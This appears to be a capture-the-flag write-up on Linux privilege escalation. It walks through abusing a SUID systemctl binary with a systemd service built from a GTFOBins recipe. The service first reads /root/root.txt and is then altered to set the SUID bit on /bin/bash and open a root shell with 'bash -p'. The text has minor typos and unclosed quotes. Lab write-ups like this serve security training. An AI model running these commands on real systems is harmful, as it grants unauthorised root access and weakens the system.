Escalate our privileges and become the superuser (root) :

    ->In Linux, SUID (set owner userId upon execution) is a particular type of file permission given to a file. 
    SUID gives temporary permissions to a user to run the program/file 
    with the permission of the file owner (rather than the user who runs it).

    ->For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). 
    This is because to change your password; it will need to write to the shadowers file that you do not have access to, root does; 
    so it has root privileges to make the right changes.

    Need to find "/bin/systemctl" file


    ->Xxploit this system further to escalate your privileges :
    Become root and get the last flag (/root/root.txt) by using gtfobins script
    We can find some more info on GTFObins:
    https://gtfobins.github.io/gtfobins/systemctl/#suid

    TF=$(mktemp).service
    echo '[Service]
    Type=oneshot
    ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
    [Install]
    WantedBy=multi-user.target' > $TF
    ./systemctl link $TF
    ./systemctl enable --now $TF


    What we do is creating a Temporary service, which reads the root flag and outputs it to /tmp/output. 
    This service is saved in a variable called TF. Finally, we run the service.
    Proceed by reading the /tmp/output file and you will find the key!


    ->How to get root : 
    
    The principle is basically the same. But instead of writing:

    ExecStart=/bin/sh -c “cat /root/root.txt > /tmp/output on line 4 
    
    ->We write the following:

    ExecStart=/bin/sh -c “chmod +s /bin/bash”       

    Which is similar in the way that we start up a shell, but instead of outputting the flag to a text file, 
    we instead give ourselves execute privileges on bash

    ->Then We can then run bash by running:
    
    bash -p

    The p flag means we are running it privileged.
